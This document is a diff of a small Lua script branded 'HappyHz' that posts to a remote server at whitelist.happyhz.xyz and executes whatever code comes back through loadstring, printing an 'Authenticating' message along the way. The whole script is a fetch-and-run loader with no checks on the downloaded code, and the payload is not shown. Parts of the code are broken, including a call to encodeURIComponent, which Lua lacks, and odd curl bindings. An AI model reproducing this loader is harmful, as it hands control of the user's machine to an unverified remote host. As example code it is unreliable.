@@ -1,41 +1,45 @@
-local http = require("socket.http")
-local ltn12 = require("ltn12")
+-- Require Lua modules
+local curl = require("luacurl.safe")
+local socket = require("socket")
 
--- Set the URL of the loadscript API endpoint
-local url = "http://whitelist.happyhz.xyz:1599/loadscript"
+-- The URL of the API endpoint to fetch the Lua code
+local url = "http://whitelist.happyhz.xyz:1599/test.php"
 
--- Set the Lua code to load and execute
-local luaCode = [[
-  print("Hello from Lua!")
-]]
+-- The Lua code to execute
+local luaCode = "happyhz"
 
--- Encode the Lua code as a URL-encoded string
-local requestBody = "loadscript=" .. encodeURIComponent(luaCode)
-
--- Set the request headers
-local requestHeaders = {
-  ["Content-Type"] = "application/x-www-form-urlencoded",
-  ["Content-Length"] = tostring(#requestBody)
+-- Initialize the cURL session
+local c = curl.easy{
+  url = url,
+  post = true,
+  postfields = "loadscript=" .. luaCode,
+  writefunction = function(str)
+    result = str
+  end
 }
 
--- Send the POST request to load the Lua code
-local responseBody = {}
-local response, responseCode, responseHeaders = http.request({
-  url = url,
-  method = "POST",
-  headers = requestHeaders,
-  source = ltn12.source.string(requestBody),
-  sink = ltn12.sink.table(responseBody)
-})
+-- Execute the cURL session
+c:perform()
+
+-- Close the cURL session
+c:close()
 
 -- Check for errors and handle them
-if responseCode ~= 200 then
-  print("Error: " .. response)
-  return
+if not result then
+    print("Error: Failed to fetch Lua code from API endpoint.")
+    return
 end
 
--- Convert the response table to a string
-responseBody = table.concat(responseBody)
+-- Execute the Lua code
+print("[HappyHz]: [1/3] Authenticating...")
+local func, err = loadstring(result)
+if not func then
+    print("Error: Failed to execute Lua code.")
+    return
+end
 
--- Execute the loaded Lua code
-loadstring(responseBody)()
+-- Call the function with optional arguments
+local success, err = pcall(func)
+
+-- Print the result of executing the Lua code
+print(success and "Success!" or "Error: " .. err)
